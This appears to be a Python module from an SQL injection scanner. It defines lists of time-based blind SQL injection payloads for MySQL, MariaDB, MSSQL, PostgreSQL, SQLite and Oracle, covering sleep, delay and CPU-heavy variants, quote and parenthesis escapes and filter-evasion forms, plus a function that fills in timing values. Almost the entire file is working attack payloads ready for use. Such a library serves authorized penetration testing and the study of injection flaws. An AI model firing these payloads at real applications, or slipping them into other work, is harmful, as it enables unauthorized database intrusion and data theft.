# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Time-based (blind) payloads.
"""
from __future__ import annotations

from typing import List

# ---------------------------------------------------------------------------
# Time-based payloads
# Keys: "auto", "mysql", "mssql", "postgres", "sqlite"
# Placeholders: {delay} is replaced at runtime with opts.time_threshold
# ---------------------------------------------------------------------------

TIME_PAYLOADS: dict[str, List[str]] = {
    "auto": [
        # Try each DBMS in order; first one that works identifies the DB
        "' AND SLEEP({delay})-- -",
        "' AND SLEEP({delay})#",
        "' AND pg_sleep({delay})-- -",
        "'; WAITFOR DELAY '0:0:{delay}'-- -",
        "' AND randomblob(100000000)-- -",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}))-- -",
        # Paren-escape contexts
        "')) AND SLEEP({delay})-- -",
        "')) AND pg_sleep({delay})-- -",
        "')) AND randomblob({blob_size})-- -",
    ],
    "mysql": [
        "' AND SLEEP({delay})-- -",
        "' AND SLEEP({delay})#",
        "' OR SLEEP({delay})-- -",
        "1' AND SLEEP({delay})-- -",
        " AND SLEEP({delay})-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
        "' AND BENCHMARK({bench},MD5(1))-- -",
        # Paren-escape contexts
        "') AND SLEEP({delay})-- -",
        "')) AND SLEEP({delay})-- -",
        "')) AND SLEEP({delay}) --",
        "'XOR(if(now()=sysdate(),sleep({delay}),0))OR'",
        "1'=sleep({delay})='1",
        "%2b(select*from(select(sleep({delay})))a)%2b'",
        "/**/xor/**/sleep({delay})",
        "or (sleep({delay})+1) limit 1 --",
        "(SELECT 1 FROM (SELECT SLEEP({delay}))A)",
    ],
    "mariadb": [
        "' AND SLEEP({delay})-- -",
        "' AND SLEEP({delay})#",
        " AND SLEEP({delay})-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
        "') AND SLEEP({delay})-- -",
        "')) AND SLEEP({delay})-- -",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'-- -",
        "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -",
        "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'-- -",
        "')) ; WAITFOR DELAY '0:0:{delay}'-- -",
    ],
    "postgres": [
        "' AND pg_sleep({delay})-- -",
        "'; SELECT pg_sleep({delay})-- -",
        "' OR pg_sleep({delay})-- -",
        "' AND 1=1 AND pg_sleep({delay})-- -",
        "') AND pg_sleep({delay})-- -",
        "')) AND pg_sleep({delay})-- -",
    ],
    "sqlite": [
        # WITH RECURSIVE is reliable in containerised SQLite where randomblob is too fast
        "' AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{bench}) SELECT COUNT(*) FROM cnt)>0-- -",
        "') AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{bench}) SELECT COUNT(*) FROM cnt)>0-- -",
        "' AND randomblob({blob_size})-- -",   # fallback: large randomblob
        "') AND randomblob({blob_size})-- -",
        "')) AND randomblob({blob_size})-- -",
        "')) AND randomblob({blob_size}) --",
    ],
    "oracle": [
        # Oracle has no simple sleep — use DBMS_PIPE.RECEIVE_MESSAGE (requires execute priv)
        # or heavy CPU via DECODE to simulate delay
        "' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}))-- -",
        "' AND 1=(SELECT COUNT(*) FROM all_objects WHERE rownum<{bench})-- -",
    ],
}


def get_time_payloads(dbms: str, delay: int) -> List[str]:
    """Return time-based payloads with {delay} and {bench}/{blob_size} substituted."""
    raw = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS["auto"])
    bench = delay * 5_000_000        # MySQL BENCHMARK iterations
    blob_size = delay * 350_000_000  # SQLite randomblob bytes (~0.35s per MB in Docker)
    return [
        p.format(delay=delay, bench=bench, blob_size=blob_size)
        for p in raw
    ]
